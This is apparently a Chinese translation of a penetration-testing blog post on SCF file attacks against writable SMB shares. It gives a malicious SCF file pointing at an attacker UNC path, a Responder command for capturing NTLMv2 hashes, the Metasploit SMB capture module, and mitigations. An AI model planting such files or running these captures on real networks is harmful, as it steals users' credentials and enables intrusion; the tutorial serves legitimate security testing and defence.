---
title: SMB 共享 – SCF 文件攻击
author: AmtuOrRF
categories: [Misc]
tags: [Misc]
---
`https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/`

SMB 是一种在组织中广泛用于文件共享目的的协议。在内部渗透测试期间，发现包含敏感信息（如纯文本密码和数据库连接字符串）的文件共享并不罕见。但是，即使文件共享不包含任何可用于连接到其他系统的数据，但为未经身份验证的用户配置了写入权限，也可以获取域用户或Meterpreter shell的密码哈希。

### 收集哈希

SCF（Shell 命令文件）文件可用于执行一组有限的操作（如显示 Windows 桌面或打开 Windows 资源管理器）并不是什么新鲜事。但是，SCF文件可用于访问特定的UNC路径，该路径允许渗透测试人员构建攻击。下面的代码可以放在一个文本文件中，然后需要将其植入网络共享中。

```cmd
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

将文件另存为 SCF 文件将使该文件在用户浏览文件时执行。在文件名前面添加 @ 符号会将 pentestlab.scf 放在共享驱动器的顶部。

需要使用以下参数执行响应程序，以捕获将浏览共享的用户的哈希。

```bash
$ responder -wrf --lm -v -I eth0
```


当用户浏览共享时，将自动建立从其系统到 SCF 文件中包含的 UNC 路径的连接。Windows 将尝试使用用户的用户名和密码对该共享进行身份验证。在该身份验证过程中，随机的 8 字节质询密钥从服务器发送到客户端，并使用此质询密钥再次对散列的 NTLM/LANMAN 密码进行加密。响应程序将捕获 NTLMv2 哈希。



与Responder相反，Metasploit Framework有一个模块，可用于从SMB客户端捕获质询 - 响应密码哈希。


`auxiliary/server/capture/smb`

## 结论

这种技术利用了所有网络中真正常见的东西，如共享，以便检索密码哈希并获取meterpreter shell。唯一的要求是用户需要浏览包含恶意 SCF 文件的共享。但是，可以通过执行以下操作来防止这些攻击：

-   使用 Kerberos 身份验证和 SMB 签名
-   不允许未经身份验证的用户在文件共享中具有写入权限
-   确保使用 NTLMv2 密码哈希而不是 LanMan